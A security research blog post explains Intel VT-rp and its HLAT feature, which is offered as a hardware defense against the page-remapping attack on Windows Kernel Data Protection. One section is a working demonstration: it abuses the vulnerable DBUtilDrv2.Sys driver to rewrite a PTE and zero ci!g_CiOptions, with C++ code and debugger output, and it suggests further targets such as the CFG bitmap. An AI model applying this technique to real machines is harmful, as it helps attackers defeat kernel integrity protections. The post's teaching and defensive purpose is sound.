---
layout: post
title: "Intel VT-rp with demos - Part 1. remapping attack and HLAT"
---
- [EPT-based security and an attack against it](#ept-based-security-and-an-attack-against-it)
  - [Bypassing KDP with the remapping attack](#bypassing-kdp-with-the-remapping-attack)
  - [Demo - making `ci!g_CiOptions` zero under KDP](#demo---making-cig_cioptions-zero-under-kdp)
- [Intel VT Redirect Protection (VT-rp)](#intel-vt-redirect-protection-vt-rp)
  - [HLAT and the remapping attack](#hlat-and-the-remapping-attack)
  - [Demo - protecting `ci!g_CiOptions` with HLAT](#demo---protecting-cig_cioptions-with-hlat)
  - [Availability](#availability)
- [Conclusion](#conclusion)
  - [Acknowledgement](#acknowledgement)
  - [Notes](#notes)

This post introduces Intel VT Redirect Protection (VT-rp) -- what it is, how it works, and why it was invented, with [a sample hypervisor](https://github.com/tandasat/Hello-VT-rp/) and example scenarios. This is the first part of a 2 posts-series, focusing on Hypervisor-managed Linear Address Translation, HLAT, one of the features VT-rp provides.

We use Windows as an example environment to discuss exploitation techniques and scenarios, but the same principle applies to any other operating system.


## EPT-based security and an attack against it

_([Skip this section](#bypassing-kdp-with-the-remapping-attack) if you are familiar with EPT, HVCI, and KDP)_

Extended page table, EPT, is an Intel implementation of [Second Level Address Translation](https://en.wikipedia.org/wiki/Second_Level_Address_Translation), which allows a hypervisor to control memory access by a guest by adding one more address translation step that cannot be tampered with by the guest.

The below diagram illustrates how a linear address is translated into a physical address using ETP.
![](/blog/img/posts/2023-06-01/ept_paging.png)
_(LA: linear address, GPA: guest physical address, PA: physical address)_

Because a guest cannot tamper with this mechanism even with the kernel privileges, a hypervisor can use it to protect the OS kernel from a kernel-mode exploit by making sensitive kernel-mode code and data non-writable at the EPT level, for example. This way, even if an attacker gains arbitrary kernel-mode read and write primitives, she cannot corrupt the sensitive code or data.

This diagram shows that code remains non-writable even if an attacker changes the permission in the guest paging structures.
![](/blog/img/posts/2023-06-01/hvci.png)

Windows implements this idea as features called HyperVisor-protected Code Integrity (HVCI) and Kernel Data Protection (KDP). HVCI makes kernel-mode code non-writable, and KDP makes kernel-mode data non-writable through EPT.


### Bypassing KDP with the remapping attack

KDP can be bypassed if an attacker has an arbitrary kernel-mode read and write primitive by remapping the protected LA onto another GPA that is still configured to be writable at the EPT level.

The below illustration shows permissions for sensitive data protected by KDP.
![](/blog/img/posts/2023-06-01/kdp.png)

As shown below, to modify the contents of the sensitive data, an attacker can (1) create a copy of the data, (2) modify the contents of the copy, then (3) update the guest paging structures of the protected LA to point to the modified copy. With this, (4) when the protected LA is read, the modified contents are read instead, bypassing KDP. This method is [called "remapping"](https://kvmforum2020.sched.com/event/eE4F) or page swapping.
![](/blog/img/posts/2023-06-01/remapping.png)

This is a well-understood limitation that is explicitly called out by Microsoft and further discussed [by](https://www.fortinet.com/blog/threat-research/driver-signature-enforcement-tampering) [several](https://datafarm-cybersecurity.medium.com/code-execution-against-windows-hvci-f617570e9df0) [others](https://lore.kernel.org/all/20230505152046.6575-1-mic@digikod.net/). Here is the quote from the [Microsoft article introducing KDP](https://www.microsoft.com/en-us/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/).
> _KDP does not enforce how the virtual address range mapping a protected region is translated._


### Demo - making `ci!g_CiOptions` zero under KDP

_(Skip this section if you have a good handle on the remapping attack)_

Let us carry out the remapping attack and make `ci!g_CiOptions` zero. Here is the outline of the demo:

1. Locate a linear address, guest physical address, and a PTE for `ci!g_CiOptions`
2. Confirm that `ci!g_CiOptions` is non-zero
3. Confirm that `ci!g_CiOptions` is read-only in EPT
4. Find a page filled with zero
5. Modify the PTE to translate the page into the zero-filled page
6. Confirm that `ci!g_CiOptions` is zero

We use `livekd` and `DBUtilDrv2.Sys`, one of the vulnerable drivers that are not yet block-listed, on Windows build 10.0.22621.1848 on a 12th gen processor. Secure boot is disabled. HVCI and hypervisor-debugging are enabled.

![](/blog/img/posts/2023-06-01/msinfo32.png)

1. Locate a linear address, guest physical address of, and a PTE for `ci!g_CiOptions`

    ```
    > livekd
    kd> !pte ci!g_cioptions
                                            VA fffff8024b082004
        (...)    PTE at FFFFEE7C01258410
        (...)    contains 890000011CEAA121
        (...)    pfn 11ceaa    -G--A--KR-V
    ```
    - LA = `fffff8024b082004`
    - GPA = `11ceaa004`
    - PTE at `ffffee7c01258410`

2. Confirm that `ci!g_CiOptions` is non-zero

    ```
    kd> dd ci!g_cioptions l1
    fffff802`4b082004  0001c006

    kd> !dd 11ceaa004 l1
    #11ceaa004 0001c006
    ```

3. Confirm that `ci!g_CiOptions` is read-only in EPT

    We break into the target's Hyper-V from another machine and dump EPT entries for the GPA using the [hvexts](https://github.com/tandasat/hvext) extension.
    ```
    hv+0x239e70:
    fffff844`49cd9e70 cc              int     3
    hvext loaded. Execute !hvext_help [command] for help.

    kd> !ept_pte 0x11ceaa000
        (...)    PTe at 0x11b49a550
        (...)    contains 0x1000011ceaa531
        (...)    pfn 0x11ceaa U---R
    ```
    Notice `U---R`, which indicates that the page is not writable at the EPT level.

4. Find a page filled with zero

    In this demo, we use an existing zero-filled page as a new GPA of `ci!g_CiOptions`, instead of creating a copy as explained above. This is possible because our goal is simply to make the variable zero, and the page containing the variable has only a few other variables that are ok to become zero as well.

    We found `0x200000` was one of such zero-filled pages.
    ```
    kd> !dd 200000
    #  200000 00000000 00000000 00000000 00000000
    #  200010 00000000 00000000 00000000 00000000
    ...
    ```

5. Modify the PTE to translate the page into the zero-filled page

    We install `DBUtilDrv2.Sys` on the target and use its arbitrary kernel-mode write primitive to update the PTE to point to `0x200000`. I added the below code to [malk](https://github.com/worawit/malk) for this.
    ```cpp
    {
        // Hard-coded value taken from the previous step
        ULONG64 cioptions_addr = 0xfffff8024b082004;
        ULONG64 pte_addr = 0xffffee7c01258410;
        ULONG64 new_pte_value = 0x8900000000200121; // pfn == 200000

        // Show the current ci!g_CiOptions value
        UINT32 cioptions_value = -1;
        dbutil_read(hDevice, cioptions_addr, &cioptions_value, sizeof(cioptions_value));
        printf("ci!g_CiOptions:\n");
        printf("0x%llx  %08x\n", cioptions_addr, cioptions_value);

        // Change the value of PTE to point to the new GPA
        printf("\nRemapping LA of ci!g_CiOptions\n\n");
        dbutil_write(hDevice, pte_addr, &new_pte_value, sizeof(new_pte_value));

        // Show the current ci!g_CiOptions value
        cioptions_value = -1;
        dbutil_read(hDevice, cioptions_addr, &cioptions_value, sizeof(cioptions_value));
        printf("ci!g_CiOptions:\n");
        printf("0x%llx  %08x\n", cioptions_addr, cioptions_value);
    }
    ```

    Executing the above code shows `ci!g_CiOptions` became zero after remapping.
    ```
    ...
    ci!g_CiOptions:
    0xfffff8024b082004  0001c006

    Remapping LA of ci!g_CiOptions

    ci!g_CiOptions:
    0xfffff8024b082004  00000000
    ```

At this point, we effectively modified the contents of the variable that is supposed to be read-only with KDP.

Important to note that making `ci!g_CiOptions` zero under this setup (ie, HVCI enabled) does not let you load an unsigned driver. The secure kernel still performs its own certificate check, detects the issue, and bug checks the system (<a name="body1">[*1](#note1)</a>).

Instead, it is more interesting to think about new targets of this attack. Taking kernel-mode Code Flow Guard (CFG) as an example, Windows maintains the bitmap that indicates valid destinations of indirect calls. For CFG to be effective against kernel-mode exploits, this bitmap is write-protected through EPT. An attacker, however, might be able to remap the LA of the bitmap to a new GPA to make her shell-code valid destination. Another approach is replacing a sensitive function pointers as demonstrated in [Code Execution against Windows HVCI](https://datafarm-cybersecurity.medium.com/code-execution-against-windows-hvci-f617570e9df0) by [Worawit](https://twitter.com/sleepya_).

Really, anything marked as read-only in EPT could be an interesting target of the remapping attack. On the above-mentioned Windows setup, [there are several such regions](https://gist.github.com/tandasat/a4092484c63b0390b45e93140f080795).


## Intel VT Redirect Protection (VT-rp)

Preventing the remapping attack without substantial performance impact is deemed unachievable. A hypervisor could make the guest paging structures read-only and inspect each write operation, but that incurs a non-negligible performance impact due to frequent VM-exit. Hence, Intel came up with a processor extension branded as Intel VP Redirect Protection (VT-rp).

Intel VT-rp was introduced with the 12th generation and consists of three features:
- HLAT: Hypervisor-managed Linear Address Translation
- PW: Paging write
- GPV: Guest-paging verification

Although all of the three work together, we will focus on HLAT in this post since it is the primary component to prevent the remapping attack. For the PW and GPV, stay tuned for the part 2.


### HLAT and the remapping attack

In short, when HLAT is enabled, LA -> GPA translation may be done based on the hypervisor-managed paging structures as depicted below.
![](/blog/img/posts/2023-06-01/hlat.png)

Normally, when LA -> GPA translation is needed, the processor reads CR3 and walks through the paging structures managed by the guest OS. On the other hand, when HLAT is enabled, the processor reads the HLATP (HLAT pointer) VMCS field and walks through another set of the paging structures managed by the hypervisor.

The below is a pseudo-code of how a processor translates LA -> GPA -> PA with and without HLAT.
```python
# Translate LA to PA with EPT
def translate_la_during_vmx_non_root(la):
    gpa = translate_la(la)
    return translate_gpa(gpa)

# Translate LA to GPA
def translate_la(la):
    # (1) Determine if HLAT paging should occur
    if should_do_hlat_paging(la):
        # (2) If so, use paging structures through HLATP VMCS
        pml4 = hlatp_vmcs()
    else:
        pml4 = guest_cr3_vmcs()
    # (3) Walk paging structures as usual
    # ...

# Determine if HLAT paging should occur
def should_do_hlat_paging(la):
    return (
        hlat_enabled and
        is_in_range(la, hlat_prefix_size_vmcs())
    )
```
Notice that (1) when HLAT is enabled and the given LA is within a range specified by the HLAT prefix size VMCS, (2) the processor locates PML4 through HLATP, instead of the guest CR3. (3) The layout of the hypervisor-managed paging structures and the process of HLAT paging is almost identical to the traditional paging structure and paging (<a name="body2">[*2](#note2)</a>).

This makes the remapping attack no-op, because even if the guest-managed paging structures (or the guest CR3) is modified, those will not be used. LA -> GPA translation is done through the hypervisor-managed paging structures which remain to translate the LA to the intended GPA.

![](/blog/img/posts/2023-06-01/hlat_vs_remapping.png)


### Demo - protecting `ci!g_CiOptions` with HLAT

Let us test this with a [custom hypervisor that enables HLAT](https://github.com/tandasat/Hello-VT-rp/). The steps of the demo are as follows:
1. Load the custom hypervisor and boot Windows on top of it
2. Locate a linear address and a PTE for `ci!g_CiOptions`
3. Activate HLAT and protect translation for `ci!g_CiOptions`
4. Carry out the remapping attack and confirm `ci!g_CiOptions` remains to be unchanged

We use the same setup except:
- Hyper-V is not activated. Our custom hypervisor puts Windows into the guest mode.
- Only one logical processor is activated. This is only to simplify the implementation of the custom hypervisor.

1. Load the custom hypervisor and boot Windows on top of it

    We boot into a UEFI shell, load the custom hypervisor and continue booting Windows. Windows will boot as a guest of our hypervisor.
    ![](/blog/img/posts/2023-06-01/uefi_shell.jpg)

2. Locate a linear address and a PTE for `ci!g_CiOptions`

    ```
    > livekd
    kd> !pte ci!g_cioptions
                                            VA fffff80227dd2004
        (...)    PTE at FFFFF9FC0113EE90
        (...)    contains 89000004879D5963
        (...)    pfn 4879d5    -G-DA--KW-V
    ```
    - LA = `fffff80227dd2004`
    - PTE at `fffff9fc0113ee90`

3. Activate HLAT and protect translation for `ci!g_CiOptions`

    We use the `client` executable in the same repository to protect a linear address with HLAT via hypercall `0`.
    ```
    > D:\client.exe 0 0xfffff80227dd2004
    ```
    In our implementation, the hypervisor builds hypervisor-managed paging structures by copying the current guest-managed paging structures (which are not yet tampered with).

4. Carry out the remapping attack and confirm `ci!g_CiOptions` remains to be unchanged

    We perform the same operation as the previous demo.
    ```
    ...
    ci!g_CiOptions:
    0xfffff80227dd2004  00000006

    Remapping LA of ci!g_CiOptions

    ci!g_CiOptions:
    0xfffff80227dd2004  00000006
    ```

    Notice that the write operation was successful, but the value of `ci!g_CiOptions` was unchanged. This is because HLAT paging is active for this LA. The hypervisor-managed paging structure was used instead of the tampered guest-managed paging structure, which translated the LA to the original GPA. This way, the hypervisor can enforce LA -> GPA translation without having to intercept write operations against the guest paging structures.

![](/blog/img/posts/2023-06-01/totally_vpro.jpg)
_(Protection in place)_


### Availability

Intel VT-rp is available in a subset of 12th+ generation Intel processors. You can check the availability of the feature on the Intel spec pages. For example with Core i7-1265U, [the specification page](https://www.intel.ca/content/www/ca/en/products/sku/226258/intel-core-i71265u-processor-12m-cache-up-to-4-80-ghz/specifications.html) shows VT-rp is available.

![](/blog/img/posts/2023-06-01/spec_vtrp.png)

As to the software-side, as far as I am know, none of major hypervisors including Microsoft Hyper-V makes use of VT-rp yet (<a name="body3">[*3](#note3)</a>).

No equivalent feature is available on AMD processors.


## Conclusion

In this post, we looked into how EPT can be used to harden the OS kernel against attackers with arbitrary kernel-mode read write primitives, how the remapping attack bypasses one of such hardening mechanisms (eg, KDP), and how HLAT, one of the features Intel VT-rp offers, prevents the attack.

Intel VT-rp is available on a subset of 12th+ gen Intel processors and is still not used by any major hypervisors.

Until HLAT is used and hardware supporting the feature becomes prevalent, the remapping attack will remain to be a relevant exploitation technique. Security software designers and attackers should keep it in mind when considering the use of EPT-based data protection.


### Acknowledgement

- [Andrea Allievi](https://twitter.com/aall86) for [Alder Lake and the new Intel Features](https://www.andrea-allievi.com/blog/alder-lake-and-the-new-intel-features/), as well as answering a few questions.
- [Kunal Mehta](https://twitter.com/kmgkv1) for providing feedback on the draft and correcting my misunderstanding.
- [Connor McGarr](https://twitter.com/33y0re) for [Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG](https://connormcgarr.github.io/hvci/). This helped me catch up recent kernel-exploitation techniques.


### Notes

<a name="note1">*1</a> ([🔙](#body1)): If you tamper with `ci.dll` in the VTL0 and force it to load an unsigned driver, the secure kernel injects NMI and crashes the system. This is the call stack of that situation.
```
0: kd> k
 # Child-SP          RetAddr               Call Site
00 fffff802`3ab24ca8 fffff802`36d63461     nt!KeBugCheckEx
01 fffff802`3ab24cb0 fffff802`36cba5b4     nt!HvlSkCrashdumpCallbackRoutine+0x81
02 fffff802`3ab24cf0 fffff802`36c39d42     nt!KiProcessNMI+0x1ea2f4
03 fffff802`3ab24d30 fffff802`36c39aae     nt!KxNmiInterrupt+0x82
04 fffff802`3ab24e70 fffff802`352b001c     nt!KiNmiInterrupt+0x26e
05 fffff989`6f8af108 fffff802`36c282eb     0xfffff802`352b001c
06 fffff989`6f8af110 fffff802`36b3854d     nt!HvlSwitchToVsmVtl1+0xab
07 fffff989`6f8af250 fffff802`37038fd9     nt!VslpEnterIumSecureMode+0x161
08 fffff989`6f8af320 fffff802`37038f38     nt!VslCompleteSecureDriverLoad+0x6d
09 fffff989`6f8af3d0 fffff802`3711e16e     nt!MiCompleteSecureDriverLoad+0x78
0a fffff989`6f8af480 fffff802`36cce045     nt!MiMarkKernelImageCfgBits+0x13e07e
0b fffff989`6f8af560 fffff802`36f7f026     nt!MiProcessKernelCfgImage+0x1ba3e5
0c fffff989`6f8af590 fffff802`36f7e5b9     nt!MiFinalizeDriverCfgState+0xe
0d fffff989`6f8af5c0 fffff802`36f7e0be     nt!MmLoadSystemImageEx+0x4e5
0e fffff989`6f8af770 fffff802`36f82547     nt!MmLoadSystemImage+0x2e
0f fffff989`6f8af7c0 fffff802`36fc44b7     nt!IopLoadDriver+0x24b
```

<a name="note2">*2</a> ([🔙](#body2)): The only difference between traditional paging and HLAT paging is the treatment of bit[11] in the paging structures called “Restart” bit. During HLAT paging, when this bit is encountered, HLAT paging is aborted and the traditional paging takes place as if HLAT was disabled. This allows enabling HLAT paging only for select pages as shown below.
![](/blog/img/posts/2023-06-01/restart.png)

<a name="note3">*3</a> ([🔙](#body3)): Code to set the HALTP VMCS exists in Microsoft Hyper-V but is not exercised. [Andrea Allievi noted in his blog](#acknowledgement) and told me that Microsoft has been actively working on integrating VT-rp.


----

_Found this post interesting? We offer a training course about the Intel virtualization technology. [Check out the course syllabus](https://tandasat.github.io/)._
